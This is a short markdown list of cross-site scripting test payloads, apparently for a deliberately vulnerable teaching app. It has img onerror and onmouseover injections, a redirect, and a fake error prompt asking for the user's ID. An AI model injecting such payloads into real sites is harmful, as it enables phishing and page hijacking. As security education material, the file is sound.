# Examples to test the application

## Try to send some basics values

HTML tags : strong, h1, h2..., input

example : <input type="text" value="whatever" style="color:white; background-color:red"></input>

>Note: Most popular js functions are onerror, onload and onmouseover

## XSS Persistent (stocked) with `onerror`

- `<img src=whatever onerror=alert('youhou')>`
- `<img src=whatever onerror="window.location='https://github.com/fabienAstia/xss-vulnerabilities/tree/main';">`
- `<img src=whatever onerror=console.log("Error is success")>`
- `<img src/onerror=prompt('Sorry,&nbsp;an&nbsp;error&nbsp;was&nbsp;occurred.&nbsp;Please,&nbsp;enter&nbsp;your&nbsp;Id&nbsp;to&nbsp;continue')>`

## XSS DOM-based with link

- `<a onmouseover="alert('youhou')">Click me!</a>`
- `<a onmouseover="document.body.style='color:blue;'">Click me!</a>`
- `<a onmouseover="document.body.style='transform:rotate(180deg);'">Click me!</a>`

> Note: in modern tools and navigators. These not workings :

- `<script>alert('youhou')</script>`
- `<img src/onerror=prompt('Sorry, an error was occurred. Please, enter your Id to continue')>`
- `<component is=script text=alert(1)>`